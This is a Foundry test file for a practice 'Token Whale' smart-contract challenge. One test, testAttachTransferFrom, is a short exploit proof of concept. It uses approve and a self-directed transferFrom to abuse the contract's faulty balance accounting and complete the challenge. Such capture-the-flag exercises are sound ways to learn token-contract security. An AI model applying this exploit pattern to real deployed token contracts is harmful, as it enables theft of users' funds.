// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;

import "forge-std/Test.sol";
import "source/math/TokenWhale.sol";

contract TokenWhaleTest is Test {

  TokenWhaleChallenge tokenWhaleChallenge;

  address account1;
  address account2;

  function setUp() public {
    account1 = vm.addr(1);
    vm.label(account1, "Account1[address]");
    vm.deal(account1, 10 ether);

    tokenWhaleChallenge = new TokenWhaleChallenge(account1); 
    vm.label(address(tokenWhaleChallenge), "TokenWhaleChallenge[contract]");
    vm.startPrank(account1);
  }

  function testNormalTransfer() public {

    // Just a normal transfer
    tokenWhaleChallenge.transfer(account2, 100);

    uint expectedAccount1Balance = 900;
    uint actualAccount1Balance = tokenWhaleChallenge.balanceOf(account1);
    assertEq(actualAccount1Balance, expectedAccount1Balance);

    uint expectedAccount2Balance = 100;
    uint actualAccount2Balance = tokenWhaleChallenge.balanceOf(account2);
    assertEq(actualAccount2Balance, expectedAccount2Balance);

    console.log(expectedAccount1Balance);
    console.log(actualAccount1Balance);
    console.log(expectedAccount2Balance);
    console.log(actualAccount2Balance);
  }

  function testAttachTransferFrom() public {

    // add smart contract function calls here
    tokenWhaleChallenge.transfer(account2, 501);
    vm.stopPrank();

    vm.startPrank(account2);
    tokenWhaleChallenge.approve(account1, 501);
    vm.stopPrank();

    vm.startPrank(account1);
    tokenWhaleChallenge.transferFrom(account2, account2, 501);
    
    assertTrue(tokenWhaleChallenge.isComplete());

    uint actualAccount1Balance = tokenWhaleChallenge.balanceOf(account1);
    uint actualAccount2Balance = tokenWhaleChallenge.balanceOf(account2);
    console.log(actualAccount1Balance);
    console.log(actualAccount2Balance);
  }

  fallback() external payable { }
  receive() external payable { }
}

